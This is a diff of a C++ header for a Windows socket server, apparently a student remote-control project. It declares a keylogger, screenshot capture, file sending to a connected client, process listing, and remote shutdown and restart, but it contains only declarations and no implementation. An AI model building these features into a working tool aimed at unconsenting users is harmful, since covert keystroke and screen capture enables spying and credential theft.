@@ -1,3 +1,5 @@
+
+
 // server_socket.h
 #ifndef SERVER_SOCKET_H
 #define SERVER_SOCKET_H
@@ -6,15 +8,17 @@
 #include <winsock2.h>
 #include <windows.h>
 #include <winerror.h>
+#include <tlhelp32.h> //using for list app
 #include <string>
-#include <iostream>
-#include <thread>
-#include <mutex>
+#include <iostream> 
+#include <thread> //using for keyLogger
+#include <mutex> //using for keyLogger
 #include <gdiplus.h>
 #include <fstream>
 #include <vector>
 #include <cstdint>
 #include <sstream>
+#include <map> //using for keyLogger
 
 // Ensure NO_ERROR is defined
 #ifndef NO_ERROR
@@ -28,25 +32,10 @@ using namespace Gdiplus;
 
 class Server {
 public:
-    bool isLogging = false;
-    std::thread keyLoggerThread;
-    std::string logFilePath = "log.txt";
-    std::mutex logMutex;
     Server(int port);
     ~Server();
     bool start();
     void listenForConnections();
-     //yêu cầu: keylogger
- 
-
-
-    void startKeyLogger();
-    void stopKeyLogger(SOCKET);
-    void keyLogger();
-    void sendLogFile(SOCKET);
-    int saveKey(int _key, const char* file);
-   
-
 private:
     int port;
     SOCKET listenSocket; 
@@ -58,9 +47,19 @@ private:
     std::vector<unsigned char> captureScreenshot();
     void copyFileAndSend(SOCKET clientSocket, const std::string& sourceFileName, const std::string& destinationFileName);
     
+    //shutdown and restart
     void shutdownServer();
     void restartServer();
+    //keylogger
+    bool isLogging = false;
+    std::thread keyLoggerThread;
+    std::mutex logMutex;
+    void startKeyLogger();
+    void stopKeyLogger(SOCKET);
+    void keyLogger();
     
+    bool hasVisibleWindow(DWORD processID);
+    void ListApplications(SOCKET);
 
 };
 
